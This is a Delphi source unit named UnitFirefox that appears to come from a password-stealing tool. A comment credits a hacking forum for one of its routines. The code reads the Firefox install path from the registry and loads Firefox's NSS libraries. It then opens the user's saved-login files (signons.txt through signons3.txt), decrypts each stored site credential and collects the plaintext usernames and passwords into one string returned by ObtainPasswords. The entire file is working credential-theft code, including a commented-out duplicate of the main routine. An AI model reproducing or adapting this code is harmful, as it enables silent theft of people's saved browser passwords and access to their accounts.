unit UnitFirefox;

interface

uses
 Windows,UnitSharedData;

var
  version : String;
  FireFoxPath: String;
  FullString: string;

function ObtainPasswords: string;

implementation

//by steve10120 from HackHound
function ReadKeyToString(hRoot:HKEY; sKey:string; sSubKey:string):string;
var
  hOpen: HKEY;
  sBuff: array[0..255] of char;
  dSize: integer;
begin
  if (RegOpenKeyEx(hRoot, PChar(sKey), 0, KEY_QUERY_VALUE, hOpen) = ERROR_SUCCESS) then begin
    dSize := SizeOf(sBuff);
    RegQueryValueEx(hOpen, PChar(sSubKey), nil, nil, @sBuff, @dSize);
    Result := sBuff
  end;
  RegCloseKey(hOpen);
end;

procedure GetFFInfos;
begin
  version := ReadKeyToString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Mozilla\Mozilla Firefox', 'CurrentVersion');
  FireFoxPath:= ReadKeyToString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Mozilla\Mozilla Firefox\' + version + '\Main', 'Install Directory') + '\';
end;

{procedure GetFirefoxPasswords(SignonsFile : String);
type
  TSECItem = packed record
  SECItemType: dword;
  SECItemData: pchar;
  SECItemLen: dword;
end;
PSECItem = ^TSECItem;
var
  NSSModule: THandle;
  NSS_Init: function(configdir: pchar): dword; cdecl;
  NSSBase64_DecodeBuffer: function(arenaOpt: pointer; outItemOpt: PSECItem; inStr: pchar; inLen: dword): dword; cdecl;
  PK11_GetInternalKeySlot: function: pointer; cdecl;
  PK11_Authenticate: function(slot: pointer; loadCerts: boolean; wincx: pointer): dword; cdecl;
  PK11SDR_Decrypt: function(data: PSECItem; result: PSECItem; cx: pointer): dword; cdecl;
  NSS_Shutdown: procedure; cdecl;
  PK11_FreeSlot: procedure(slot: pointer); cdecl;
  hToken: THandle;
  ProfilePath: array [0..MAX_PATH] of char;
  ProfilePathLen: dword;
  FirefoxProfilePath: pchar;
  MainProfile: array [0..MAX_PATH] of char;
  MainProfilePath: pchar;
  PasswordFile: THandle;
  PasswordFileSize: dword;
  PasswordFileData: pchar;
  Passwords: string;
  BytesRead: dword;
  CurrentEntry: string;
  Site: string;
  Name: string;
  Value: string;
  KeySlot: pointer;
  EncryptedSECItem: TSECItem;
  DecryptedSECItem: TSECItem;
  Result: string;
  Str: string;
begin
  if Length(Version) = 0 then exit;

  if StrToInt(Copy(version,0,1)) < 3 Then begin
    LoadLibrary(pchar(FirefoxPath + 'nspr4.dll'));
    LoadLibrary(pchar(FirefoxPath + 'plc4.dll'));
    LoadLibrary(pchar(FirefoxPath + 'plds4.dll'));
  end else begin
    LoadLibrary(pchar(FirefoxPath + 'mozcrt19.dll'));
    LoadLibrary(pchar(FirefoxPath + 'sqlite3.dll'));
    LoadLibrary(pchar(FirefoxPath + 'nspr4.dll'));
    LoadLibrary(pchar(FirefoxPath + 'plc4.dll'));
    LoadLibrary(pchar(FirefoxPath + 'plds4.dll'));
    LoadLibrary(pchar(FirefoxPath + 'nssutil3.dll'));
  end;

  LoadLibrary(pchar(FirefoxPath + 'softokn3.dll'));
  NSSModule := LoadLibrary(pchar(FirefoxPath + 'nss3.dll'));
  @NSS_Init := GetProcAddress(NSSModule, 'NSS_Init');
  @NSSBase64_DecodeBuffer := GetProcAddress(NSSModule, 'NSSBase64_DecodeBuffer');
  @PK11_GetInternalKeySlot := GetProcAddress(NSSModule, 'PK11_GetInternalKeySlot');
  @PK11_Authenticate := GetProcAddress(NSSModule, 'PK11_Authenticate');
  @PK11SDR_Decrypt := GetProcAddress(NSSModule, 'PK11SDR_Decrypt');
  @NSS_Shutdown := GetProcAddress(NSSModule, 'NSS_Shutdown');
  @PK11_FreeSlot := GetProcAddress(NSSModule, 'PK11_FreeSlot');

  if @NSS_Init = nil then exit;
  if @NSSBase64_DecodeBuffer = nil then exit;
  if @PK11_GetInternalKeySlot = nil then exit;
  if @PK11_Authenticate = nil then exit;
  if @PK11SDR_Decrypt = nil then exit;
  if @NSS_Shutdown = nil then exit;
  if @PK11_FreeSlot = nil then exit;

  OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken);
  ProfilePathLen := MAX_PATH;
  ZeroMemory(@ProfilePath, MAX_PATH);
  GetEnvironmentVariable('APPDATA',ProfilePath,ProfilePathLen);
  FirefoxProfilePath := pchar(profilePath +'\Mozilla\Firefox\profiles.ini');
  GetPrivateProfileString('Profile0', 'Path', '', MainProfile, MAX_PATH, FirefoxProfilePath);
  MainProfilePath := pchar(profilePath + '\Mozilla\Firefox\' + mainProfile + '\' + signonsfile);
  PasswordFile := CreateFile(MainProfilePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  PasswordFileSize := GetFileSize(PasswordFile, nil);
  GetMem(PasswordFileData, PasswordFileSize);
  ReadFile(PasswordFile, PasswordFileData^, PasswordFileSize, BytesRead, nil);
  CloseHandle(PasswordFile);
  Passwords := PasswordFileData;
  FreeMem(PasswordFileData);
  Delete(Passwords, 1, Pos('.' + #13#10, Passwords) + 2);
  if NSS_Init(pchar(profilePath + '\Mozilla\Firefox\' + mainProfile)) = 0 then begin
    KeySlot := PK11_GetInternalKeySlot;
    if KeySlot <> nil then begin
      if PK11_Authenticate(KeySlot, True, nil) = 0 then begin

        while Length(Passwords) <> 0 do begin
          CurrentEntry := Copy(Passwords, 1, Pos('.' + #13#10, Passwords) - 1);
          Delete(Passwords, 1, Length(CurrentEntry) + 3);

          Site := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
          Delete(CurrentEntry, 1, Length(Site) + 2);
          //WriteLn(Site);
          FullString := FullString + Site + '|';

          while Length(CurrentEntry) <> 0 do begin
            Name := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
            Delete(CurrentEntry, 1, Length(Name) + 2);

            Value := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
            Delete(CurrentEntry, 1, Length(Value) + 2);

            NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Value), Length(Value));
            if PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil) = 0 then begin
              Result := DecryptedSECItem.SECItemData;
              SetLength(Result, DecryptedSECItem.SECItemLen);
              //if Length(Name) = 0 then Name := '(unnamed value)';
              //WriteLn(Name, ' = ', Result);
              FullString := FullString + Result + '|';
            end else begin
              //WriteLn('PK11SDR_Decrypt Failed!'); //scheint immer zu kommen wenn ein KeySlot fertig ist
            end
          end;
          FullString := FullString + #13#10;
          //messagebox(0,pchar(FullString),'zdrg',0);
        end;
      end else begin
        //WriteLn('PK11_Authenticate Failed!');
      end;
      PK11_FreeSlot(KeySlot);
    end else begin
      //WriteLn('PK11_GetInternalKeySlot Failed!');
    end;
    NSS_Shutdown;
  end else begin
    //WriteLn('NSS_Init Failed!');
  end;
end; }

procedure GetFirefoxPasswords(SignonsFile : String);
type
  TSECItem = packed record
  SECItemType: dword;
  SECItemData: pchar;
  SECItemLen: dword;
end;
PSECItem = ^TSECItem;
var
  NSSModule: THandle;
  NSS_Init: function(configdir: pchar): dword; cdecl;
  NSSBase64_DecodeBuffer: function(arenaOpt: pointer; outItemOpt: PSECItem; inStr: pchar; inLen: dword): dword; cdecl;
  PK11_GetInternalKeySlot: function: pointer; cdecl;
  PK11_Authenticate: function(slot: pointer; loadCerts: boolean; wincx: pointer): dword; cdecl;
  PK11SDR_Decrypt: function(data: PSECItem; result: PSECItem; cx: pointer): dword; cdecl;
  NSS_Shutdown: procedure; cdecl;
  PK11_FreeSlot: procedure(slot: pointer); cdecl;
  hToken: THandle;
  ProfilePath: array [0..MAX_PATH] of char;
  ProfilePathLen: dword;
  FirefoxProfilePath: pchar;
  MainProfile: array [0..MAX_PATH] of char;
  MainProfilePath: pchar;
  PasswordFile: THandle;
  PasswordFileSize: dword;
  PasswordFileData: pchar;
  Passwords: string;
  BytesRead: dword;
  CurrentEntry: string;
  Site: string;
  Name: string;
  Value: string;
  KeySlot: pointer;
  EncryptedSECItem: TSECItem;
  DecryptedSECItem: TSECItem;
  Result: string;
  Str: string;
begin
  if Version = '' then exit;

  If StrToInt(Copy(version,0,1)) < 3 Then begin
    LoadLibrary(pchar(FirefoxPath + 'nspr4.dll'));
    LoadLibrary(pchar(FirefoxPath + 'plc4.dll'));
    LoadLibrary(pchar(FirefoxPath + 'plds4.dll'));
  end else begin
    LoadLibrary(pchar(FirefoxPath + 'mozcrt19.dll'));
    LoadLibrary(pchar(FirefoxPath + 'sqlite3.dll'));
    LoadLibrary(pchar(FirefoxPath + 'nspr4.dll'));
    LoadLibrary(pchar(FirefoxPath + 'plc4.dll'));
    LoadLibrary(pchar(FirefoxPath + 'plds4.dll'));
    LoadLibrary(pchar(FirefoxPath + 'nssutil3.dll'));
  end;

  LoadLibrary(pchar(FirefoxPath + 'softokn3.dll'));
  NSSModule := LoadLibrary(pchar(FirefoxPath + 'nss3.dll'));

  @NSS_Init := GetProcAddress(NSSModule, 'NSS_Init');
  @NSSBase64_DecodeBuffer := GetProcAddress(NSSModule, 'NSSBase64_DecodeBuffer');
  @PK11_GetInternalKeySlot := GetProcAddress(NSSModule, 'PK11_GetInternalKeySlot');
  @PK11_Authenticate := GetProcAddress(NSSModule, 'PK11_Authenticate');
  @PK11SDR_Decrypt := GetProcAddress(NSSModule, 'PK11SDR_Decrypt');
  @NSS_Shutdown := GetProcAddress(NSSModule, 'NSS_Shutdown');
  @PK11_FreeSlot := GetProcAddress(NSSModule, 'PK11_FreeSlot');

  if @NSS_Init = nil then exit;
  if @NSSBase64_DecodeBuffer = nil then exit;
  if @PK11_GetInternalKeySlot = nil then exit;
  if @PK11_Authenticate = nil then exit;
  if @PK11SDR_Decrypt = nil then exit;
  if @NSS_Shutdown = nil then exit;
  if @PK11_FreeSlot = nil then exit;

  OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken);
  ProfilePathLen := MAX_PATH;
  ZeroMemory(@ProfilePath, MAX_PATH);
  GetEnvironmentVariable('APPDATA',ProfilePath,ProfilePathLen);
  FirefoxProfilePath := pchar(profilePath +'\Mozilla\Firefox\profiles.ini');
  GetPrivateProfileString('Profile0', 'Path', '', MainProfile, MAX_PATH, FirefoxProfilePath);
  MainProfilePath := pchar(profilePath + '\Mozilla\Firefox\' + mainProfile + '\' + signonsfile);
  PasswordFile := CreateFile(MainProfilePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  PasswordFileSize := GetFileSize(PasswordFile, nil);
  GetMem(PasswordFileData, PasswordFileSize);
  ReadFile(PasswordFile, PasswordFileData^, PasswordFileSize, BytesRead, nil);
  CloseHandle(PasswordFile);
  Passwords := PasswordFileData;
  FreeMem(PasswordFileData);
  Delete(Passwords, 1, Pos('.' + #13#10, Passwords) + 2);
  if NSS_Init(pchar(profilePath + '\Mozilla\Firefox\' + mainProfile)) = 0 then begin
    KeySlot := PK11_GetInternalKeySlot;
    if KeySlot <> nil then begin
      if PK11_Authenticate(KeySlot, True, nil) = 0 then begin

        while Length(Passwords) <> 0 do begin
          CurrentEntry := Copy(Passwords, 1, Pos('.' + #13#10, Passwords) - 1);
          Delete(Passwords, 1, Length(CurrentEntry) + 3);

          Site := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
          Delete(CurrentEntry, 1, Length(Site) + 2);
          //WriteLn(Site);
          FullString := FullString + Site + '|';

          while Length(CurrentEntry) <> 0 do begin
            Name := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
            Delete(CurrentEntry, 1, Length(Name) + 2);

            Value := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
            Delete(CurrentEntry, 1, Length(Value) + 2);

            NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Value), Length(Value));
            if PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil) = 0 then begin
              Result := DecryptedSECItem.SECItemData;
              SetLength(Result, DecryptedSECItem.SECItemLen);
              FullString := FullString + Result + '|';
            end else begin
            end
          end;
          FullString := FullString + #13#10;
          //messagebox(0,pchar(FullString),'zdrg',0);
        end;
      end else begin
        //WriteLn('PK11_Authenticate Failed!');
      end;
      PK11_FreeSlot(KeySlot);
    end else begin
      //WriteLn('PK11_GetInternalKeySlot Failed!');
    end;
    NSS_Shutdown;
  end else begin
    //WriteLn('NSS_Init Failed!');
  end;
end;

function ObtainPasswords: string;
begin
  FullString := '';
  GetFFInfos;
  GetFirefoxPasswords('signons.txt');
  GetFirefoxPasswords('signons2.txt');
  GetFirefoxPasswords('signons3.txt');
  Result := FullString;
end;

end.
